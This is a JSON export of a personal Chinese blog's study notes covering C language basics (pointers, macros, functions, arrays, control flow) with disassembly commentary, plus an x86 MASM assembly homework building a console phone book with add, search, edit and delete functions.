0;&#125;","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"C语言学习笔记","slug":"学习笔记/C语言学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"C语言基础04--指针","date":"2020-05-16T02:40:50.000Z","path":"wiki/学习笔记/C语言学习笔记/C语言基础04--指针/","text":"C语言基础04–指针指针与变量之间的关系*：指针运算符，跟在变量前表示指向地址的值 &amp;：取地址运算符 12345678910111213141516171819#include&lt;stdio.h&gt;int main() &#123; int a = 123; int * b = &amp;a; //指什么类型的地址，声明什么类型的指针 //这里是把a的地址给b *b = 666; //a指的是地址上的值 //b指的是地址 //&amp;a指的是地址 //*b指的是地址上的值 a = 567; return 0;&#125;//在汇编中//mov dword ptr [a] ,2F6ah//dword 是数据长度，4字节//ptr 指针//a a的地址//[a] a的值 指针与数组12345678910#include&lt;stdio.h&gt;int main() &#123; //数组是内存地址中连续的存储空间 //数组的名字指向数组首地址 int n[5] = &#123; 1,2,3,4,5 &#125;; int * a = n; //a就是数组首地址，*a的值为1 int b = *(a + 1);//这里+1指的是+1个int类型的长度 //(a+1)相当于是数组下一位的地址，然后前面跟上*来取地址的值 return 0;&#125; 指针与函数函数指针12345678910111213141516171819#include&lt;stdio.h&gt;int sub(int a, int b);int main() &#123; //指针函数是函数,指针类型的函数，返回值也是指针 //函数指针是指针，指向函数的指针 int(*mysub)(int a, int b);//函数指针 mysub = sub; //不带括号不带参数的函数名是函数的首地址 int c = mysub(2,1); // 调用的时候，mysub指向跳转表的sub，然后跳转表指向函数的sub int d = sub(2, 3); // 调用的时候，sub也先指向跳转表的sub，然后跳转表指向函数sub return 0;&#125;int sub(int a, int b) &#123; return a - b;&#125; 指针函数12345678910111213141516#include&lt;stdio.h&gt;int * ret(int * a);int main() &#123; int b[3] = &#123; 1,2,3 &#125;; int a = &amp;b[1]; int * c = ret(a); //这里的c是地址，是a的地址,也就是把函数返回的地址给c int d = *c; //*c是a的地址的值 return 0;&#125;int * ret(int * a) &#123; //传入一个地址作为参数 int b = a; //a为地址 int c = *a; //*a为a的值 return a; //返回的是a的地址&#125;","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"C语言学习笔记","slug":"学习笔记/C语言学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"C语言基础03--宏&函数&数组","date":"2020-05-16T00:40:50.000Z","path":"wiki/学习笔记/C语言学习笔记/C语言基础03--宏&函数&数组/","text":"C语言基础03–宏&amp;函数&amp;数组宏预先定义一个东西，编译的时候被替换掉，有点常量的感觉 123456789101112#include&lt;stdio.h&gt;#define nNUm = 10; //宏，类似于常量，无参数宏#define add (a+b); //表达式，无参数宏#define max(a,b) ((a&gt;b)?(a):(b)) //三元运算符，有参数宏int main()&#123; int a=1; int b=2; printf(\"%d\",add);//3 printf(\"%d\",max(a,b));//2 printf(\"%d\",a+nNum); //11 return 0&#125; typedef给类型起别名,define宏也能达到类似的效果，但是不能处理指针 12345int main()&#123; typedef int df; df a&#x3D;1; printf(&quot;%d&quot;,a);&#125; 函数123456789101112131415#include&lt;stdio.h&gt;int add(int a, int b); //函数声明,函数位于main函数之下，必须在上面声明一下int main() &#123; int a = 11, b = 22; int c = 0; c = add(a, b); //33 printf(\"%d\", c); return 0;&#125;int add(int a ,int b) &#123; //函数定义 return a + b; //返回值&#125; 递归自己嵌套自己 123456789101112131415161718#include&lt;stdio.h&gt;int func1(int n); int main() &#123; int n = 5; func1(n); return 0;&#125;int func1(int n) &#123; if (n != 0) &#123; n--; printf(\"hello the %d world\\n\", n); return func1(n); &#125; else &#123; printf(\"end\"); return 0; &#125;&#125; 一维数组数组的内容必须是同一类型的，通过下标来索引 1234567#include&lt;stdio.h&gt;int main() &#123; int n[5] = &#123;1,2,3,4,6&#125;; printf(\"%d\",n[4]); return 0;&#125; 多维数组12345678910111213141516#include&lt;stdio.h&gt;int main()&#123; int n[3][3]=&#123; &#123;1,2,3&#125;, &#123;2,3,4&#125;, &#123;3,4,5&#125; &#125;; printf(\"%d\",n[2][2]); for(int i=0;i&lt;3;i++)&#123; for(int j=0;j&lt;3;j++)&#123; printf(\"%d\".n[i][j]); &#125; &#125; return 0;&#125;","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"C语言学习笔记","slug":"学习笔记/C语言学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"C语言基础02--条件语句","date":"2020-05-15T07:40:50.000Z","path":"wiki/学习笔记/C语言学习笔记/C语言基础02--条件语句/","text":"C语言基础02–条件语句goto语句类似于汇编中的JMP,尽量不要用goto，实在没办法再用 123456789#include&lt;stdio.h&gt;int main() &#123; goto loop; printf(\"1\");loop: printf(\"2\"); return 0;&#125; if-else语句123456789int main()&#123; if(true)&#123; //条件为true，执行这里 &#125;else&#123; //反之，执行这里 &#125; //cmp //jnz&#125; switch语句12345678910111213141516int main()&#123; int n1=5; switch(n1)&#123; case 1: printf(\"1\");break; case 2: printf(\"2\");break; default: printf(\"?\");break; &#125; return 0; //cmp //jz //cmp //jz&#125; while语句12345678910111213int main()&#123; int n=100; while(n&gt;1)&#123;//满足条件就开始循环 printf(\"n\"); n--; &#125; return 0; // mov // cmp // call // dec // jmp&#125; do-while语句123456789101112int main()&#123; int n=0; do&#123; //先执行一遍 printf(\"1\"); n++; &#125;while(n&lt;100); //再判断条件进行循环 return 0;&#125;// mov// &#123;&#125;// cmp// jz for语句123456789101112#include&lt;stdio.h&gt;int main()&#123; for(int i=0;i&lt;100;i++)&#123;//类似while，但是把定义判断循环整合在一起了，类似于while的简写 printf(\"1\"); &#125; &#125;// mov// cmp// jz// call// jmp// inc","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"C语言学习笔记","slug":"学习笔记/C语言学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"C语言基础01--初见C语言","date":"2020-05-15T06:40:50.000Z","path":"wiki/学习笔记/C语言学习笔记/C语言基础01--初见C语言/","text":"C语言基础01–初见C语言常见函数默认情况下，main函数是C语言的起点 printf()函数是格式化输出函数 （来自stdio.h） 单行注释：/ 单行内容 / 多行注释：/* 多行内容 */ 使用VS2015创建项目 新建项目 依次选择vc++ ，win32 ，win32控制台程序 随便写个项目名称 应用程序向导里选择空项目，其他默认 从源文件添加新建项，创建.c文件 开始写代码 第一个程序123456#include&lt;stdio.h&gt;int main() &#123; printf(\"hello world!\\n\"); return 0;&#125; 程序分析vs2015反汇编代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include&lt;stdio.h&gt;int main() &#123;;前面这块用于保障程序稳定性，把栈抬高，然后可以随便弄，弄完再把栈还原，再把寄存器的值还原;将ebp存起来，然后把栈抬高0C0H位00C41760 push ebp 00C41761 mov ebp,esp 00C41763 sub esp,0C0h;把ebx，esi，edi入栈00C41769 push ebx 00C4176A push esi 00C4176B push edi;把栈抬高的位置放到edi，然后从edi刷CCCCCCCCh00C4176C lea edi,[ebp-0C0h] 00C41772 mov ecx,30h 00C41777 mov eax,0CCCCCCCCh 00C4177C rep stos dword ptr es:[edi] ;这里是直接把字符串push进去，然后调用printf，然后平栈 printf(&quot;hello world!\\n&quot;);00C4177E push offset string &quot;hello world!\\n&quot; (0C46BD0h) 00C41783 call _printf (0C41316h) 00C41788 add esp,4 return 0;;等价于eax清零，比mov eax ,0效率高00C4178B xor eax,eax &#125;;把edi,esi,ebx取出来00C4178D pop edi 00C4178E pop esi 00C4178F pop ebx;把栈放回去00C41790 add esp,0C0h ;比较一下栈是否还在原来的位置00C41796 cmp ebp,esp 00C41798 call __RTC_CheckEsp (0C4110Eh) ;还原esp和ebp00C4179D mov esp,ebp 00C4179F pop ebp ;函数执行结束00C417A0 ret 先把栈抬高，清空，用完再还原，可以实现不影响以前的栈 C语言关键字 C语言保留标识符 下划线开始的标识符 标准库函数名 C语言数据类型12345678910111213141516171819202122232425262728293031323334#include&lt;stdio.h&gt;#include&lt;stdbool.h&gt;//C99之前没有布尔类型，要用需要通过typedef的方式自己构造int main()&#123; //int家族 short num0; //2字节 int num1; //4字节 long num2; //8字节，大部分情况下 long = int 都是4字节 long long num3; unsigned short num4; // 无符号短整型 unsigned int num5; unsigned long num6; //字符 char ctmp = 'A'; //此处需要用单引号，双引号是字符串 //浮点型，存小数，也支持科学技术法 float f1;//32位 double f2;//64位 long double f3;//128位 //bool bool ff = true;//1 bool ft = false;//0 //指针 char * pch; //union联合体 //struct结构体 //enum枚举 return 0;&#125; C语言输入输出函数输入函数：scanf(“%?”,temp); 输出函数：printf(“%?”,temp); 示例：输入输出字符串12345678910#include&lt;stdio.h&gt;int main() &#123; int len = 0; char str1[20]; scanf(\"%s\", str1); len = strlen(str1); printf(\"hello world:%s,long:%d\",str1,len); return 0;&#125; 默认情况下scanf被禁用了，因为存在安全问题，需要包含一个宏才能用： 项目–属性–C/C++–预处理器–编辑 把报错里说的宏复制进去 C语言命名规则 由字母，数字，下划线组成 只能以字符和下划线开头，不能用数字开头 匈牙利命名法：变量名前+属性+类型 下划线划分 大驼峰命名：所有单词首字母大写 小驼峰命名：第一个单词首字母小写，其他首字母大写 C语言运算符算术运算符 关系运算符 逻辑运算符 位运算符 赋值运算符 其他运算符 运算符优先级https://baike.baidu.com/item/%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7/4752611#3 ​ 参考资料","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"C语言学习笔记","slug":"学习笔记/C语言学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编作业--电话簿","date":"2020-05-14T15:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编作业--电话簿/","text":"汇编作业–电话簿花了不少时间，不过总算完成这项作业了，虽然不是很完美，但也基本符合要求了，完成过程跟大家分享分享， 个人博客：https://kn0sky.com 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152**项目名称：**汇编语言电话本**项目背景：**基于同学们学习汇编语言后没有练习的问题，特以该项目作为阶段性练习。**项目目的：**熟悉汇编语言编程，练习编程逻辑，熟悉Win32 API调用模式**项目要求：**编写一个具有增删改查功能的电话本，基于控制台。具体要求如下：1. 基本功能：电话本具有姓名与电话号码两项属性，并且使用数据结构作为存储2. 增加功能：插入姓名与电话号码到数据结构的最后。3. 查询功能：输入姓名，以此作为依据，到数据结构中查找，将找到的信息打印到控制台。4. 删除功能：输入姓名或电话号码，以此作为依据，到数据结构中查找，且删除该条信息。5. 修改功能：输入姓名或电话号码，以此作为依据，到数据结构中查找，找到后打印信息，要求输入新的姓名或电话，接受后修改原有条目。 **编写指南：****1.****数组的编写方式**TelephoneNumber dd 30 DUP(?) **2.****结构体的编写方式**Name STRUCT具体成员信息Name ENDS **3.****控制台相关的API**GetStdHandle 获得标准输入输出的窗口句柄SetConsoleTextAttribute是设置控制台字体颜色和背景色CONSOLE_CURSOR_INFO用于存放控制光标信息SetConsoleCursorInfo设置光标的信息GetConsoleScreenBufferInfo取得控制台屏幕信息SetConsoleCursorPosition设置光标位置WriteConsoleOutput直接写输入缓冲区SetConsoleTitle设置控制台的标题ReadConsole 读控制台WriteConsole 写控制台 实现基本功能首先，根据前面所学的知识不能够完成本项目，目前以本项目为最终目标，将目标分解成小目标逐个击破 第一步———-基本功能：电话本具有姓名与电话号码两项属性，并且使用数据结构作为存储 数据结构首先要了解数据结构要怎么弄，我们的数据包括姓名和电话两部分，姓名是字符串，电话是数组，应该先弄清楚这两样东西怎么用 字符串定义一个字符串并通过调用消息框输出： 123456789101112131415161718192021222324.586.model flat,stdcallincludelib user32.libincludelib kernel32.libExitProcess PROTO, dwExitCode:DWORDMessageBoxA PROTO, hWnd:DWORD ,lpText:BYTE ,lpCaption:BYTE ,uType:DWORD.dataname1 db &quot;警告&quot; ,0name2 db &quot;你菜爆了&quot; ,0.codemain proc push 0 lea eax ,name1 push eax lea eax ,name2 push eax push 0 call MessageBoxA add esp,16 call ExitProcessmain ENDPEND main 通过控制台输出： 123456789101112131415.586.model flat, stdcallinclude msvcrt.incincludelib msvcrt.lib.data szText db &#39;Hello World!&#39;, 0.codemain proc invoke crt_printf, addr szText;类似于call，但比call方便，可直接在后面跟参数 mov eax ,eaxmain endpend main 数组定义一个数组赋值并输出到控制台： 1234567891011121314151617181920212223242526.386.model flat, stdcallinclude msvcrt.incincludelib msvcrt.lib.data;定义数组user db 20 dup(0)testext db &quot;hello world!&quot;,0.codemain proc ;给数组赋值 lea edi ,offset user lea esi ,offset testext mov ecx,20 rep movsb ;打印 push offset user call crt_printf mov eax ,eaxmain endpend main 数据结构到这里我们已经会使用字符串和数组了，接下来了解一下如何使用数据结构作为存储。 示例：创建一个结构体，包含两项内容，插入值并输出 123456789101112131415161718192021222324252627282930313233343536373839404142434445.386.model flat, stdcallinclude msvcrt.incincludelib msvcrt.lib.data;定义结构体Contact struct user db 20 dup(0) tel db 20 dup(0)Contact endsperson1 Contact &lt;&gt;person2 Contact &lt;&#39;john&#39;,&#39;12312312312&#39;&gt;tsname db &quot;Li Hua&quot;,0tstel db &quot;12312345678&quot;,0.codemain proc ;给结构体数组赋值 lea edi ,offset person1.tel lea esi ,offset tstel mov ecx ,20 rep movsb lea edi ,offset person1.user lea esi ,offset tsname mov ecx ,20 rep movsb push offset person1.user call crt_printf add esp ,4 push offset person1.tel call crt_printf add esp ,4 mov eax ,eaxmain endpend main 到此，基本功能已经实现，下一步，实现增加功能 实现增加功能增加功能：插入姓名与电话号码到数据结构的最后。 这里要解决两个问题 如何输入数据 如何将数据加到数据结构的最后 输入功能输入一个字符数并输出： 12345678910111213141516171819202122232425.586.model flat ,stdcallinclude msvcrt.incincludelib msvcrt.lib.data;输入格式input_format_str db &quot;%s&quot;,0 ;存放输入的变量inputstr db 0,0.codemain proc push offset inputstr push offset input_format_str call crt_scanf ;输入函数需要两个参数，一个是输入格式，一个用来保存输入的值 add esp,8 invoke crt_printf ,offset inputstr mov eax ,eaxmain endpend main 添加数据函数据此，我们可以用一个变量来计数，来计算数组最后一个位置的偏移量，通过上面的方法来实现添加数据。 初步完成添加数据功能函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485.data;结构体存储名字电话Contact struct user db 20 dup(0) tel db 20 dup(0)Contact ends;定义一个结构体数组存储所有联系人ContactList Contact 100 dup(&lt;&#39;0&#39;&gt;);定义一个临时结构用来传送数据tmpContact Contact &lt;&#39;john&#39;,&#39;123123123123&#39;&gt;;输入格式input_format_str db &quot;%s&quot;,0 ;存放输入的变量inputstr db 20 dup(0);现有数据数count dd 1 dup(0);问候语input_user_text db &quot;请输入联系人姓名：&quot;,0input_tel_text db &quot;请输入联系人电话：&quot;,0.codeaddContact proc ;消息提示1：请输入联系人姓名 push offset input_user_text call crt_printf add esp,4 ;输入 push offset inputstr push offset input_format_str call crt_scanf add esp,8 ;保存到临时用结构里 lea esi ,offset inputstr lea edi ,offset tmpContact.user mov ecx ,20 rep movsb ;---------------------------------------- ;消息提示2：请输入联系人电话 push offset input_tel_text call crt_printf add esp,4 ;输入 push offset inputstr push offset input_format_str call crt_scanf add esp,8 ;保存到临时用结构里 lea esi ,offset inputstr lea edi ,offset tmpContact.tel mov ecx ,20 rep movsb ;----------------------------------------- ;保存到数据结构的最后 lea esi ,offset tmpContact lea edi ,offset ContactList ;计算偏移,并移动 mov eax ,sizeof(Contact) mov ecx ,count imul eax,ecx add edi ,eax mov ecx ,40 rep movsb ;总数+1 inc count ;返回 retnaddContact endp 实现查询功能查询功能：输入姓名，以此作为依据，到数据结构中查找，将找到的信息打印到控制台。 这里思路就很简单了，我们把我们的联系人数组遍历一遍即可，ebx来接收要循环的次数，edx显示当前已循环的次数，如果到循环次数了，也就是遍历到联系人总数了，就结束循环跳出 12345678910111213141516171819202122232425262728293031323334353637383940414243searchContact proc mov edx ,0 mov ebx ,countl: ;判断循环条件 cmp edx ,ebx jz exit;edx&#x3D;&#x3D;ebx的时候退出 ;获取数组地址 lea esi ,offset ContactList lea edi ,offset s_test_user ;临时用待查询人姓名 ;计算偏移量来选择数组的下一位 mov eax ,sizeof(Contact) imul eax,edx add esi ,eax ;串比较 mov ecx ,20 repe cmpsb ;比较成功了，跳转到s程序，将查询到的信息打印出来 jz s ;比较失败了，edx+1，然后继续查询 inc edx jnz ls: ;edx+1，然后ebx，edx入栈出栈 inc edx push edx push ebx ;invoke会改变ebx，edx的内容 invoke crt_printf ,offset s_test_user pop ebx pop edx ;然后无条件跳转回循环中继续下一次查询 jmp lexit: retnsearchContact endp 增加一个菜单功能已经实现几个功能了，接下来我们可以新增一下菜单功能，让我们的操作看起来更直接一些 思路很简单，就是接收一个输入的值，如果值等于1就走1选项，以此类推即可,这里给出一个例子 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950.data;菜单bookmenu db &quot;电话簿（Console版）v0.1&quot;,endl, &quot;1. 添加数据&quot;,endl, &quot;2. 查询数据&quot;,endl, &quot;3. 修改数据&quot;,endl, &quot;4. 删除数据&quot;,endl, &quot;5. 添加测试用数据&quot;,endl, &quot;6. 退出程序&quot;,endl, &quot;请输入选项:&quot;,0choose db 1 dup(0)chooselist db &quot; 123456&quot;,0.codemenu: ;显示菜单 push offset bookmenu call crt_printf add esp ,4 ;输入选项 push offset choose push offset input_format_str call crt_scanf ;jcc跳转 mov ebx ,1 mov esi ,offset chooselist mov edi ,offset choose add esi ,ebx mov ecx ,1 repe cmpsb jz c1 inc ebx;此处省略c2--c5 mov esi ,offset chooselist mov edi ,offset choose add esi ,ebx mov ecx ,1 repe cmpsb jz c6 jmp menuc1: inc ebx call addContact jmp menuc6: call ExitProcess 实现修改/删除功能这里就讲个思路，方法与前面大同小异 修改/删除功能是在查询功能的基础之上新增的功能，设置一个修改flag=0，如果从菜单选中修改/删除，则flag=1，思路是通过查询函数查到数据之后，检查flag的值，如果flag=1，则进行修改/删除 删除操作其实就是把要删除的那一个部分用后面的内容覆盖掉就行了 效果图 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589.586.model flat ,stdcallinclude msvcrt.incincludelib msvcrt.libincludelib user32.libincludelib kernel32.libExitProcess PROTO, dwExitCode:DWORD.data;清零用zero db 20 dup(0);换行符endl EQU &lt;0dh,0ah&gt;;冒号maohao db &quot;:&quot;,0;结构体存储名字电话Contact struct user db 20 dup(0) tel db 20 dup(0)Contact ends;定义一个结构体数组存储所有联系人ContactList Contact 100 dup(&lt;&#39;0&#39;&gt;);保存结构体数组查询出来的信息s_user db 20 dup(0)s_tel db 20 dup(0);定义一个临时结构用来传送数据tmpContact Contact &lt;&#39;john&#39;,&#39;123123123123&#39;&gt;;默认数据tmpContact2 Contact &lt;&#39;chill&#39;,&#39;123123123123&#39;&gt;tmpContact3 Contact &lt;&#39;bob&#39;,&#39;123123123123&#39;&gt;;测试用查找字符s_test_user db 20 dup(0);输入格式input_format_str db &quot;%s&quot;,0 ;存放输入的变量inputstr db 20 dup(0);查询用户名变量searchstr db 20 dup(0);现有数据数count dd 1 dup(0);修改数据flagxg_flag dd 1 dup(0);删除数据flagsc_flag dd 1 dup(0);分割线line db &quot;----------------------------------&quot;,endl,0;问候语input_user_text db &quot;请输入联系人姓名：&quot;,endl,0input_tel_text db &quot;请输入联系人电话：&quot;,endl,0search_info db &quot;查询到信息如下：&quot;,endl,0edit_user db endl,&quot;请输入新的用户名：&quot;,endl,0edit_tel db &quot;请输入新的电话号码：&quot;,endl,0search_success db &quot;查询成功&quot;,endl,0edit_success db &quot;修改成功&quot;,endl,0add_success db &quot;添加成功&quot;,endl,0rm_success db &quot;删除成功&quot;,endl,0addtmp_success db &quot;添加临时数据成功,临时数据为:john、chill、bob&quot;,endl,0;菜单bookmenu db &quot;电话簿（Console版）v0.1&quot;,endl, &quot;1. 添加数据&quot;,endl, &quot;2. 查询数据&quot;,endl, &quot;3. 修改数据&quot;,endl, &quot;4. 删除数据&quot;,endl, &quot;5. 添加测试用数据&quot;,endl, &quot;6. 退出程序&quot;,endl, &quot;请输入选项:&gt;&quot;,0choose db 1 dup(0)chooselist db &quot; 123456&quot;,0.codeaddContact proc ;消息提示1：请输入联系人姓名 push offset input_user_text call crt_printf add esp,4 ;输入 push offset inputstr push offset input_format_str call crt_scanf add esp,8 ;保存到临时用结构里 lea esi ,offset inputstr lea edi ,offset tmpContact.user mov ecx ,20 rep movsb ;inputstr清零 lea esi ,offset zero lea edi ,offset inputstr mov ecx ,20 rep movsb ;---------------------------------------- ;消息提示2：请输入联系人电话 push offset input_tel_text call crt_printf add esp,4 ;输入 push offset inputstr push offset input_format_str call crt_scanf add esp,8 ;保存到临时用结构里 lea esi ,offset inputstr lea edi ,offset tmpContact.tel mov ecx ,20 rep movsb ;inputstr清零 lea esi ,offset zero lea edi ,offset inputstr mov ecx ,20 rep movsb ;----------------------------------------- ;保存到数据结构的最后 lea esi ,offset tmpContact lea edi ,offset ContactList ;计算偏移,并移动 mov eax ,sizeof(Contact) mov ecx ,count imul eax,ecx add edi ,eax mov ecx ,40 rep movsb push offset add_success call crt_printf add esp,4 ;总数+1 inc count ;tmpContact 清零 lea esi ,offset zero lea edi ,offset tmpConTact.user mov ecx ,20 rep movsb lea esi ,offset zero lea edi ,offset tmpConTact.tel mov ecx ,20 rep movsb ;返回 retnaddContact endpadd_default_data proc ;默认添加的数据 lea esi ,offset tmpContact lea edi ,offset ContactList mov eax ,sizeof(Contact) mov ecx ,count imul eax,ecx add edi ,eax mov ecx ,40 rep movsb inc count lea esi ,offset tmpContact2 lea edi ,offset ContactList mov eax ,sizeof(Contact) mov ecx ,count imul eax,ecx add edi ,eax mov ecx ,40 rep movsb inc count lea esi ,offset tmpContact3 lea edi ,offset ContactList mov eax ,sizeof(Contact) mov ecx ,count imul eax,ecx add edi ,eax mov ecx ,40 rep movsb inc count retnadd_default_data endpsearchContact proc ;消息提示1：请输入待查询联系人姓名 push offset input_user_text call crt_printf add esp,4 ;输入 push offset searchstr push offset input_format_str call crt_scanf add esp,8 mov edx ,0 mov ebx ,countl: cmp edx ,ebx jz exit lea esi ,offset ContactList lea edi ,offset searchstr mov eax ,sizeof(Contact) imul eax,edx add esi ,eax mov ecx ,20 repe cmpsb jz s inc edx jnz ls: inc edx push edx push ebx push eax ;将查到的数据存起来 sub esi ,20 lea edi ,offset tmpContact.user mov ecx ,20 rep movsb lea edi ,offset tmpContact.tel mov ecx ,20 rep movsb invoke crt_printf ,offset search_info invoke crt_printf ,offset tmpContact.user invoke crt_printf ,offset maohao invoke crt_printf ,offset tmpContact.tel ;检测是否需要修改 lea edi ,offset xg_flag lea esi ,offset chooselist add esi ,1 mov ecx ,1 repe cmpsb jz xg ;检测是否需要删除 lea edi ,offset sc_flag lea esi ,offset chooselist add esi ,1 mov ecx ,1 repe cmpsb jz sc pop eax pop ebx pop edx jmp lexit: ;inputstr清零 lea esi ,offset zero lea edi ,offset searchstr mov ecx ,20 rep movsb retnxg: pop eax call editContact pop ebx pop edx jmp lsc: pop eax call rmContact pop ebx pop edx jmp lsearchContact endpeditContact proc push eax ;偏移量入栈 ;消息提示1：请输入新的联系人姓名 push offset edit_user call crt_printf add esp,4 ;输入 push offset inputstr push offset input_format_str call crt_scanf add esp,8 ;保存到临时用结构里 lea esi ,offset inputstr lea edi ,offset tmpContact.user mov ecx ,20 rep movsb ;inputstr清零 lea esi ,offset zero lea edi ,offset inputstr mov ecx ,20 rep movsb ;---------------------------------------- ;消息提示2：请输入新的联系人电话 push offset edit_tel call crt_printf add esp,4 ;输入 push offset inputstr push offset input_format_str call crt_scanf add esp,8 ;保存到临时用结构里 lea esi ,offset inputstr lea edi ,offset tmpContact.tel mov ecx ,20 rep movsb ;inputstr清零 lea esi ,offset zero lea edi ,offset inputstr mov ecx ,20 rep movsb ;----------------------------------------- ;使用新的联系人覆盖老的联系人 lea esi ,offset tmpContact lea edi ,offset ContactList ;取出偏移量 pop eax add edi ,eax mov ecx ,40 rep movsb ;tmpContact 清零 lea esi ,offset zero lea edi ,offset tmpConTact.user mov ecx ,20 rep movsb lea esi ,offset zero lea edi ,offset tmpConTact.tel mov ecx ,20 rep movsb ;----------------------------------------- retneditContact endprmContact proc ;获取要删除的地址 lea edi ,offset ContactList add edi ,eax ;获取要删除的地址之后的地址 lea esi ,offset ContactList add esi ,eax add esi ,sizeof(Contact) ;获得要删除的地址之后的地址位数 mov ecx ,count imul ecx,sizeof(Contact) sub ecx,eax ;覆盖 rep movsb dec count push offset rm_success call crt_printf add esp,4 retnrmContact endpmain procmenu: ;显示菜单 push offset bookmenu call crt_printf add esp ,4 ;输入选项 push offset choose push offset input_format_str call crt_scanf ;jcc跳转 mov ebx ,1 mov esi ,offset chooselist mov edi ,offset choose add esi ,ebx mov ecx ,1 repe cmpsb jz c1 inc ebx mov esi ,offset chooselist mov edi ,offset choose add esi ,ebx mov ecx ,1 repe cmpsb jz c2 inc ebx mov esi ,offset chooselist mov edi ,offset choose add esi ,ebx mov ecx ,1 repe cmpsb jz c3 inc ebx mov esi ,offset chooselist mov edi ,offset choose add esi ,ebx mov ecx ,1 repe cmpsb jz c4 inc ebx mov esi ,offset chooselist mov edi ,offset choose add esi ,ebx mov ecx ,1 repe cmpsb jz c5 inc ebx mov esi ,offset chooselist mov edi ,offset choose add esi ,ebx mov ecx ,1 repe cmpsb jz c6 jmp menu;增加数据c1: inc ebx call addContact push offset line call crt_printf add esp,4 jmp menu;查找数据c2: inc ebx call searchContact push offset search_success call crt_printf add esp,4 push offset line call crt_printf add esp,4 jmp menu;修改数据c3: inc ebx lea edi ,offset xg_flag lea esi ,chooselist add esi ,1 mov ecx ,1 rep movsb call searchContact ;把flag变回去 lea edi ,offset xg_flag lea esi ,chooselist add esi ,0 mov ecx ,1 rep movsb push offset edit_success call crt_printf add esp,4 push offset line call crt_printf add esp,4 jmp menu;删除数据c4: inc ebx lea edi ,offset sc_flag lea esi ,chooselist add esi ,1 mov ecx ,1 rep movsb call searchContact ;把flag变回去 lea edi ,offset sc_flag lea esi ,chooselist add esi ,0 mov ecx ,1 rep movsb push offset line call crt_printf add esp,4 jmp menu;添加临时数据c5: inc ebx call add_default_data push offset addtmp_success call crt_printf add esp,4 push offset line call crt_printf add esp,4 jmp menu;退出程序c6: call ExitProcessmain endpend main 遇到的问题及其解决方案0X01 找不到msvcrt.inv文件 下载MASM SDK文件（http://www.masm32.com/） 安装，C盘装不上装其他盘也可以 在masm32文件夹下找到lib目录中找到msvcrt.lib文件，在include目录中找到msvcrt.inc文件，将它们复制到项目目录下 参考资料 VS常见错误之一：error LNK2019: 无法解析的外部符号 安装masm32 问题：Delete Operation of EXE file has Failed!的解决办法 汇编实现电话本 Tips asm基础–汇编中的结构体 汇编语言LEA和OFFSET的区别 